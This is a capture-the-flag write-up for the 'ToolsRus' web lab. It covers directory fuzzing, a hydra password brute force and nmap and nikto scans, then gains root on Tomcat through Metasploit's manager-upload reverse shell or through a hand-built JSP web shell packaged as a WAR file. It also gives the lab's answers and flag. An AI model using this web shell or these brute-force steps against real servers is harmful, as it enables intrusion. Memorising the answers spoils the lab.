# ToolsRus

## Challenge Information
- **Challenge Name**: ToolsRus
- **Category**: Web Exploitation
- **Difficulty Level**: Easy

## Initial Enumeration

1. From the given tools to be used, start using the first one. i.e. dirbuster. But I used `ffuf` instead, due to its its simplicity and efficiency:
```bash
ffuf -u http://<IP_ADDRESS>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40 -e .php,.txt,.bak,.html
```
This gives the very first directory `guidelines`.

2. Open this directory in the browser `http://<IP_ADDRESS>/guidelines`. This will give some content in which the name is given as `bob`.

3. When we did the directory traversal, we found another directory `/protected`. This is the answer for this.

4. When we visit this directory, it asks for authentication. The username is obviously `bob`. Now we have to find the password. So lets use hydra now:
```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt -t 1 -f <IP_ADDRESS> http-get /protected/
```
This will give us the password `bubbles`.

5. When we open this directory with the correct credentials, the web page shows that the file has been moved to another port. So now lets scan the ipaddress with nmap:
```bash
nmap -sV -p 1234 <IP_ADDRESS>
```
This will give the currently open port `1234`.

6. Visit the port: `http://<IP_ADDRESS>:1234/`. It will take to a new webpage where the information of the server can be found: `Apache Tomcat/7.0.88`.

7. Now as istructed, lets run the command:
```bash
nikto -h http://<IP_ADDRESS>:1234/manager/html -id bob:bubbles
```
for the specified directory with the known credentials. This will give some data in which the information of some files is also given. Count the total number of files: `5`.

8. If we run a simple nmap command:
```bash
nmap <IP_ADDRESS>
```
It will give some open ports. There will be a port `80` for http. Scan this port:
```bash
nmap -sV -p 80 <IP_ADDRESS>
```
This will give the version of the server `Apache/2.4.18`.

9. The version of the `Apache-Coyote` can be seen in the start of the result when we ran the nikto command: `1.1`.

## Exploitation Methods

### Method 1 - Using Metasploit
-> open the metasploit console using the command `msfconsole`.
-> run the command `search type:exploit tomcat` to search for the exploits of tomcat.
-> using the command `use exploit/multi/http/tomcat_mgr_upload`, select the exploit `exploit/multi/http/tomcat_mgr_upload` since we are dealing with the uploading of a script to get the reverse shell.
-> use command `show options` to see the options that we need to fill up before running the exploit. now we have to run the following command to add the required options:
1. set target 0
2. set httppassword bubbles
3. set httpusername bob
4. set rhost <IP_ADDRESS>
5. set rport 1234
6. set lhost <YOUR_THM_VPN_IP>
7. set lport 4444

10. After all these, again run the options command and verify all the options are set properly. now use command `run` to run the exploit. After the successful execution, type `shell` to get the shell. Now run `whoami` to check the user. It will give us `root`.

11. Now run the command `ls`, which will many directories in which one directory with the name of `root` is also present. Navigate into that `cd root`. Again see what files are present in there `ls`. Here you will see the file `flag.txt`. Read the contents of this file `cat flag.txt` and we will get the flag `ff1fc4a81affcc7688cf89ae7dc6e0e1`.

### Method 2 - Manual Exploitation
If you face any problem in running the exploit in metasploit, we can just upload the shell directly into the webpage. If we simply do some research that `how can we get reverse shell in Apache Tomcat/7.0.88?`, we will come to know that the directory `/manager` can help us here. So just open this directory `http://<IP_ADDRESS>/manager`. This will ask for the credentials. Simply use the credentials that we got before `bob, bubbles`. This will open a server page for the manager. Here we can see an option for uploading `war` files. Create a war file using the following steps:
- create a shell.jsp file with the following contents:
```bash
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        String s = null;
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
        while ((s = sI.readLine()) != null) {
            out.println(s);
        }
    }
%>
```

- run the commands:
```bash
mkdir -p mywebapp/WEB-INF
cp shell.jsp mywebapp/
jar -cvf shell.war -C mywebapp/ .
```
10. Now you have a shell.war file. Deploy it on the webpage, which will give message `ok` in the message field. Now simply use the url to get the user of the server `http://<IP_ADDRESS>/shell/shell.jsp?cmd=whoami`. This will give you the answer `root`.

11. Now run the url `http://<IP_ADDRESS>/shell/shell.jsp?cmd=ls`, which will many directories in which one directory with the name of `root` is also present. Navigate into that `http://<IP_ADDRESS>/shell/shell.jsp?cmd=cd root`. Again see what files are present in there `http://<IP_ADDRESS>/shell/shell.jsp?cmd=ls`. Here you will see the file `flag.txt`. Read the contents of this file `http://<IP_ADDRESS>/shell/shell.jsp?cmd=cat flag.txt` and we will get the flag `ff1fc4a81affcc7688cf89ae7dc6e0e1`.
